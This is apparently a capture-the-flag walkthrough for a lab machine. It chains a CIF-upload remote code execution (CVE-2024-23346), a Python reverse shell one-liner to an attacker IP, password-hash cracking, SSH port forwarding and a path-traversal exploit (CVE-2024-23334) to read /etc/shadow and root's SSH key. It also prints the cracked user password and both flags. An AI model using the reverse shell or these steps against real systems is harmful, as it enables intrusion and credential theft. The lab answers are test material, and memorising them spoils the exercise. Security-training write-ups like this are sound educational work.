<img width="1274" height="146" alt="image" src="https://github.com/user-attachments/assets/8c5c859c-d581-4400-80fd-b2655799b85d" />

### Stuff to learn in this box 
	1. CIF files_ 
	2. Enumeration with `netstat` (`ss`) 
	3. Port Forewarding

Do an `nmap` scan `nmap -A $box`
We found a webserver on port **5000**

Let's see what's there  
<img width="1293" height="453" alt="Pasted image 20250310091417" src="https://github.com/user-attachments/assets/5b671c4a-5321-4c95-ab86-a2d1476bd2e9" />

We found a page that analyzes **[CIF](https://en.wikipedia.org/wiki/Crystallographic_Information_File)** files, let's register an account, and login

<img width="1180" height="530" alt="Pasted image 20250310091455" src="https://github.com/user-attachments/assets/232c3008-85c9-48b2-9c42-519fec218117" />
We found an upload functionality for CIF files only, we also have an example there

Search for exploit for CIF file, we found this **[CVE-2024-23346](https://github.com/9carlo6/CVE-2024-23346)**  
Follow the instruction in the GitHub exploit page

Test for connection with `curl` in the system function using our IP  
<img width="804" height="289" alt="Pasted image 20250310111649" src="https://github.com/user-attachments/assets/036ab797-a8c3-48d8-8dc5-001906a70ff8" />


Establish an HTTP python server on your machine, then **upload** the file and **view** it:
<img width="817" height="132" alt="Pasted image 20250310112012" src="https://github.com/user-attachments/assets/ba752ffb-0d7f-4a6e-b823-a244b87454ee" />  
We have a connection which means we've got an **RCE**

Create a file and put a python reverse shell in it (I tried a lot of reverse shells only python worked) Also sounds like we have to put our reverse shell in a different file then call it from the CIF file
The Reverse Shell:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.34",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```
Don't forget to change your IP and port

Then change the `vuln.cif` file to grab the file we put the reverse shell in `pwn`, then use `python3`  
<img width="818" height="334" alt="Screenshot 2025-03-10 112439" src="https://github.com/user-attachments/assets/e5099d3c-c3e0-4d9d-b061-f402c2143b60" />

Now open a `netcat` listener on the port you chose, and a python server at the same time, Then upload the file and view it
<img width="1679" height="1049" alt="Pasted image 20250310111410" src="https://github.com/user-attachments/assets/e5f3ffc8-9f22-48dd-96e1-fe44e259046f" />

Cool! we've got a reverse shell!

Use `find` to search for any .db files, then use `sqlite3` to get in the database then retrieve all users, as shown in the screenshot below
<img width="832" height="649" alt="Pasted image 20250310095223" src="https://github.com/user-attachments/assets/5c5742d9-814d-4f23-9551-f65bc96aa9fe" />

We've found a lot of users, we can crack them all but what we need is just Rosa's password, I'm pretty sure the root password is uncrackable.

Why Rosa? if we cat out the `/etc/passwd` file we'll see that it's the only user which has a shell of `/bin/bash`

Sounds like MD5 hashing, let's crack it using `hashcat`  
<img width="805" height="481" alt="Screenshot 2025-03-10 095551" src="https://github.com/user-attachments/assets/0d7da810-4b21-4b61-a08b-7a6c0e61f2c0" />

**unicorniosrosados** is our password for **rosa**

Let's `ssh` using that password with rosa
<img width="828" height="771" alt="Pasted image 20250310100156" src="https://github.com/user-attachments/assets/c66efcd5-eb72-421a-959e-765e25686e9f" />

We got access to rosa's shell

Cat out the user flag  
<img width="740" height="64" alt="Pasted image 20250310100234" src="https://github.com/user-attachments/assets/8500abbd-f240-4500-a33d-3a38eefec8d0" />

**User Flag : 1b4a4bdd9b5961e6326a4e125007a679**

Let's do `ss -lntp` to check if there's any other ports on this box that didn't show up with `nmap`
<img width="1586" height="160" alt="Screenshot 2025-03-10 114436" src="https://github.com/user-attachments/assets/d4f58127-d994-41eb-a383-e63f3769be4c" />

There is , it's listening of the localhost on port 8080, since I have Burp suite listening on that port 

Let's forward the connection to another port e.g 8081, on your machine type `ssh -L 8081:127.0.0.1:8080 rosa@10.10.11.38`, the enter Rosa's password  
<img width="765" height="95" alt="Screenshot 2025-03-10 115549" src="https://github.com/user-attachments/assets/3ea925dd-7fb9-416a-814e-b7200e49f036" />

Now try to get to the localhost on port 8081  
<img width="1258" height="970" alt="Pasted image 20250310115901" src="https://github.com/user-attachments/assets/231ad6db-f7ab-4858-8a8a-db66dba4b444" />

Lots of useless stuff there

Open the network tab by clicking on F12, look for anything abnormal, we found this  
<img width="1669" height="471" alt="Screenshot 2025-03-11 222156" src="https://github.com/user-attachments/assets/c4f0201d-84f5-4fe8-8083-33ec8f690481" />

What is that? search about it online, And we found this **[CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC)**, Download it and run it
We don't actually need to transfer it to the target machine because it interacts with our localhost since we forwarded it there

When we run the exploit, we get `404`  
<img width="1199" height="561" alt="Pasted image 20250311224416" src="https://github.com/user-attachments/assets/b8a6ca40-133f-4cdd-86f3-3729ccbb3ec5" />

By taking a look at the exploit, it's trying to get `/etc/passwd` file within the **/static** directory on the monitoring page on `localhost:8081`, But when we look at the source code of that page we don't see any **/static** dir instead we see **/assets** dir  
<img width="984" height="319" alt="Screenshot 2025-03-11 224455" src="https://github.com/user-attachments/assets/04a7a6fc-9882-41dd-968b-a253d92aa6eb" />

So let's modify the **payload** variable to`/assets/` instead of `/static/` and try again  
<img width="1048" height="384" alt="Screenshot 2025-03-11 224130" src="https://github.com/user-attachments/assets/2904ad55-68f5-4330-87be-ba485122fd8d" />


Run the exploit again  
<img width="811" height="859" alt="Pasted image 20250311224905" src="https://github.com/user-attachments/assets/1b36ddde-0ed8-411f-bafe-d754889bf4e2" />

Cool! we got it!! But we don't need `/etc/passwd` file, we already can read it by Rosa user, we need `/etc/shadow` file that contains the root hash password

So let's modify the **File** variable from `etc/passwd` to `etc/shadow`, then run it again  
<img width="1313" height="867" alt="Pasted image 20250311225256" src="https://github.com/user-attachments/assets/ca527a49-fb90-4489-b065-9d9930952f07" />

Cool! we got it even though it's unreadable for anyone except root, if we try to crack the root password we probably can't do it, it's mostly impossible to be cracked, also we ignored it before!

What if we try to read the root flag immediately!  
<img width="814" height="68" alt="Pasted image 20250311230431" src="https://github.com/user-attachments/assets/bb54bca9-5742-4e37-992e-1ff721aa3a58" />

Ooh! we did it! but it doesn't actually count as a Privilege Escalation

We can look for a root SSH key as we know the file name mostly is **id_rsa** or **authorized_keys**  
<img width="1660" height="905" alt="Pasted image 20250311230843" src="https://github.com/user-attachments/assets/4f7e710b-7bf2-4dd8-b28d-e1a9d2a8b473" />

We found both, even better!! 

Let's copy the **id_rsa** to a file in our machine and change it's permission to **600**  
<img width="1085" height="171" alt="Screenshot 2025-03-11 231738" src="https://github.com/user-attachments/assets/36300a5f-5621-4dc4-83f7-e87712652b0a" />


Now let's `ssh` to **root** using the **id_rsa** file  
<img width="1291" height="658" alt="Pasted image 20250311232159" src="https://github.com/user-attachments/assets/a787b0fc-4d3a-4c14-8010-3e659a56838e" />

Cool!! Now we are root! We did a Privilege Escalation! that one definitely counts hah

Let's cat out the root flag  
<img width="748" height="100" alt="Pasted image 20250311232301" src="https://github.com/user-attachments/assets/84d57434-341b-49b0-a7d3-23bc633248d0" />


**Root Flag : 38f323c4bdc0a1c5b2f50af766c52269**

**Congrats! You pwned the machine successfully!**  
<img width="692" height="628" alt="Pasted image 20250729102347" src="https://github.com/user-attachments/assets/7f694fd9-e782-445a-bcc1-b04117363c75" />
